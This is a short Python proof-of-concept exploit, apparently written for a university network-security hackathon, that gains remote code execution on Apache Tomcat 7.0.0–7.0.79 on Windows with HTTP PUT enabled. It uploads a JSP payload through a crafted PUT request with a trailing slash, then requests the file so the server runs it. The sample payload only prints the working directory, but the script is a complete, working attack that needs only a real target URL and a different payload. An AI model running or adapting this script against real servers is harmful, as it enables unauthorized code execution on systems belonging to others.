'''
Title: Exploit for Remote Code Execution (RCE) on versions of Apache Tomcat v7.0.0 to v7.0.79
Author: Yash Bansod <yashbansod33@gmail.com>
Team: IIT Mandi
Intended for: SAPTANG LAB'S NETWORK SECURITY HACKATHON
Description: When running Apache Tomcat 7.0.0 to 7.0.79 on Windows with HTTP PUTs enabled (e.g. via setting the read-only initialisation parameter of the Default to false) it was possible to upload a JSP file to the server via a specially crafted request. This JSP could then be requested and any code it contained would be executed by the server. That could lead to remote code execution on the server.
Pre-requisites: HTTP PUTs enabled in web.xml conf file
Tested on: Apache Tomcat v7.0.69
'''
#!/usr/bin/python
import sys
import requests

targetURL = 'http://targeturl/payload.jsp' #Url of the the Apache Tomcat Server along with the name of the jsp filed as it should appear in servers dir
payload = '<% out.write(System.getProperty("user.dir")); %>' #Payload for RCE in .JSP format

r = requests.put(targetURL+'/', data=payload) #Sending PUTs request with payload

r = requests.get(targetURL) #For seeing the output of RCE

print(r.content)
